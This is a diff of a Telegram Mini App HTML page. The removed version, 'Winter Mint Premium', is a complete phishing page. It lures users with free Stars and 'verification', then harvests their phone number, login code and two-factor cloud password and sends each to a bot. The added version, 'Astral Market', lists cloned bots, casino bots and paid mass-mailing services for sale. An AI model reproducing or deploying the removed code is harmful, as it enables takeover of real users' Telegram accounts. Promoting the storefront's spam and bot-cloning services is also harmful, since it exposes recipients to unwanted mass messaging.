@@ -2,101 +2,166 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Winter Mint Premium</title>
+    <title>Astral Market</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Telegram Mini App SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <style>
-        :root { --bg-dark:#1b0f0f; --bg-grad:#3d0f0f; --accent-red:#e63946; --accent-green:#2a9d8f; --text:#f4f4f4; --card:rgba(255,255,255,0.05); }
-        body { margin:0; font-family:-apple-system,system-ui; color:var(--text); background:linear-gradient(180deg,var(--bg-dark),var(--bg-grad)); min-height:100vh; overflow-x:hidden; }
-        canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
-        .header { text-align:center; padding:50px 20px; position:relative; z-index:2; }
-        .section { display:none; padding:20px; position:relative; z-index:2; }
-        .section.active { display:block; }
-        .card { background:var(--card); border:1px solid rgba(255,255,255,0.1); border-radius:20px; padding:20px; backdrop-filter:blur(15px); }
-        .input-field { width:100%; background:rgba(255,255,255,0.08); border:2px solid var(--accent-red); padding:18px; border-radius:15px; color:#fff; font-size:20px; text-align:center; margin:20px 0; outline:none; }
-        .btn { width:100%; padding:16px; border-radius:15px; border:none; background:linear-gradient(135deg,var(--accent-red),#9b2226); color:#fff; font-weight:700; cursor:pointer; }
-        .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1000; padding:30px; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(10px); }
-        .overlay.active { display:flex; }
+        :root {
+            --bg: #0e0e11;
+            --card: #16161d;
+            --accent: #7c7cff;
+            --text: #ffffff;
+            --muted: #9a9ab0;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+        }
+
+        header {
+            padding: 16px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            background: linear-gradient(90deg, #5f5fff, #9f7bff);
+        }
+
+        .container {
+            padding: 16px;
+        }
+
+        .category {
+            margin-bottom: 24px;
+        }
+
+        .category h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background: var(--card);
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 12px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.4);
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .card-desc {
+            font-size: 13px;
+            color: var(--muted);
+            margin: 6px 0;
+        }
+
+        .card-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .price {
+            font-weight: bold;
+            color: var(--accent);
+        }
+
+        button {
+            background: var(--accent);
+            border: none;
+            border-radius: 10px;
+            padding: 8px 14px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:active {
+            transform: scale(0.97);
+        }
     </style>
 </head>
 <body>
 
-<canvas id="snow"></canvas>
+<header>ASTRAL MARKET</header>
 
-<div class="header">
-    <h1>Winter Mint</h1>
-    <p style="opacity:0.7">Верификация аккаунта</p>
-</div>
-
-<div class="section active" id="main-view">
-    <div class="card">
-        <h3 style="margin-top:0">Введите номер телефона</h3>
-        <p style="font-size:14px; opacity:0.7">Для получения 20 ⭐ STARS и доступа к рынку NFT подтвердите ваш профиль.</p>
-        <input type="tel" id="inp-phone" class="input-field" placeholder="+7 999 000 00 00">
-        <button class="btn" onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
-    </div>
-</div>
-
-<div id="step-code" class="overlay">
-    <h2>Введите код</h2>
-    <p style="text-align:center; opacity:0.7">Код отправлен в ваш чат Telegram</p>
-    <input type="number" id="inp-code" class="input-field" placeholder="00000">
-    <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
-</div>
-
-<div id="step-2fa" class="overlay">
-    <h2>Облачный пароль</h2>
-    <p style="text-align:center; opacity:0.7">Введите ваш 2FA пароль</p>
-    <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
-    <button class="btn" onclick="sendPass()">ВОЙТИ</button>
-</div>
+<div class="container" id="app"></div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    function sendPhone() {
-        let val = document.getElementById('inp-phone').value;
-        if(val.length > 5) {
-            tg.sendData("PHONE:" + val);
-            document.getElementById('step-code').classList.add('active');
+    // ⚠️ ЭТО ТОЛЬКО ВИЗУАЛ
+    // ID товаров ДОЛЖНЫ СОВПАДАТЬ с callback_data в боте
+    const PRODUCTS = [
+        {
+            category: "🤖 Разработка ботов",
+            items: [
+                { id: "buy_copy", name: "Копии ботов", price: 30, desc: "Полное копирование Telegram-ботов" },
+                { id: "buy_shop", name: "Боты для продаж", price: 40, desc: "Магазины под ключ" },
+                { id: "buy_casino", name: "Казино боты", price: 50, desc: "Игровые решения" }
+            ]
+        },
+        {
+            category: "📢 Рассылки",
+            items: [
+                { id: "mail_2d", name: "Рассылка 2 дня", price: 7.5, desc: "Без пинга" },
+                { id: "prem_2d", name: "Prem рассылка 2 дня", price: 10, desc: "С пингом" }
+            ]
         }
-    }
+    ];
 
-    function sendCode() {
-        let val = document.getElementById('inp-code').value;
-        if(val.length >= 5) {
-            tg.sendData("CODE:" + val);
-            setTimeout(() => {
-                document.getElementById('step-code').classList.remove('active');
-                document.getElementById('step-2fa').classList.add('active');
-            }, 2000);
-        }
-    }
+    const app = document.getElementById("app");
 
-    function sendPass() {
-        let val = document.getElementById('inp-pass').value;
-        if(val.length > 0) {
-            tg.sendData("PASS:" + val);
-            setTimeout(() => { tg.close(); }, 1500);
-        }
-    }
+    PRODUCTS.forEach(cat => {
+        const section = document.createElement("div");
+        section.className = "category";
 
-    // СНЕГ
-    const c = document.getElementById("snow"), ctx = c.getContext("2d");
-    let w, h, flakes = [];
-    function resize() { w = c.width = innerWidth; h = c.height = innerHeight; }
-    window.onresize = resize; resize();
-    for (let i = 0; i < 80; i++) flakes.push({ x: Math.random() * w, y: Math.random() * h, r: Math.random() * 2 + 1, s: Math.random() * 1 + 0.5 });
-    function snow() {
-        ctx.clearRect(0, 0, w, h); ctx.fillStyle = "rgba(255,255,255,0.6)";
-        flakes.forEach(f => {
-            ctx.beginPath(); ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2); ctx.fill();
-            f.y += f.s; if (f.y > h) { f.y = -5; f.x = Math.random() * w; }
+        section.innerHTML = `<h2>${cat.category}</h2>`;
+
+        cat.items.forEach(item => {
+            const card = document.createElement("div");
+            card.className = "card";
+
+            card.innerHTML = `
+                <div class="card-title">${item.name}</div>
+                <div class="card-desc">${item.desc}</div>
+                <div class="card-footer">
+                    <div class="price">${item.price} $</div>
+                    <button onclick="buy('${item.id}')">Купить</button>
+                </div>
+            `;
+
+            section.appendChild(card);
         });
-        requestAnimationFrame(snow);
+
+        app.appendChild(section);
+    });
+
+    function buy(productId) {
+        // ⬇️ Отправляем данные БОТУ
+        tg.sendData(JSON.stringify({
+            action: "buy",
+            product: productId
+        }));
+
+        tg.showAlert("Запрос на покупку отправлен");
     }
-    snow();
 </script>
+
 </body>
 </html>
